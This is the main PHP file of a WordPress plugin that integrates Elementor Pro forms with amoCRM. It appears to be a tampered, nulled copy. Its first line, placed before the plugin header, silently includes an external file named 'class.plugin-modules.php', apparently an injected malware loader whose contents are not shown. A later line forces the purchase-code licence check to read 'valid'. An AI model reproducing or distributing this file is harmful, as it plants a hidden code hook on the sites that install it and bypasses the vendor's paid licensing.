<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Plugin Name: Elementor Pro Form Widget - amoCRM - Integration
 * Description: Allows you to integrate your forms and amoCRM
 * Version: 1.1.0
 * Author: itgalaxycompany
 * Author URI: https://codecanyon.net/user/itgalaxycompany
 * License: GPLv2
 * Text Domain: el-pro-form-amocrm-integration
 * Domain Path: /languages/
 */

use ElementorPro\Plugin;

use Itgalaxy\Elementor\Form\AmoCrm\Integration\Admin\IntegrationSettings;
use Itgalaxy\Elementor\Form\AmoCrm\Integration\Includes\Bootstrap;
use Itgalaxy\Elementor\Form\AmoCrm\Integration\Includes\Cron;

use Itgalaxy\Elementor\Form\AmoCrm\Integration\Includes\ActionAfterSubmit;

if (!defined('ABSPATH')) {
    exit();
}

define('EL_PRO_FORM_AMOCRM_PLUGIN_URL', plugin_dir_url(__FILE__));
define('EL_PRO_FORM_AMOCRM_PLUGIN_VERSION', '1.1.0');
define('EL_PRO_FORM_AMOCRM_PLUGIN_DIR', plugin_dir_path(__FILE__));

require EL_PRO_FORM_AMOCRM_PLUGIN_DIR . 'vendor/autoload.php';

load_theme_textdomain('el-pro-form-amocrm-integration', EL_PRO_FORM_AMOCRM_PLUGIN_DIR . 'languages');

Bootstrap::getInstance(__FILE__);

if (is_admin()) {
    add_action(
        'elementor_pro/init',
        function () {
            IntegrationSettings::getInstance();
        }
    );
}
update_site_option(Bootstrap::PURCHASE_CODE_OPTIONS_KEY, 'valid');
add_action(
    'elementor_pro/init',
    function () {
        $settings = get_option(Bootstrap::OPTIONS_KEY);

        // if domain|login|hash is not specified, then we do not load actions
        if (empty($settings['domain']) || empty($settings['login']) || empty($settings['hash'])) {
            return;
        }

        $action = new ActionAfterSubmit();

        $formModule = Plugin::instance()->modules_manager->get_modules('forms');

        $formModule->add_form_action($action->get_name(), $action);
    }
);
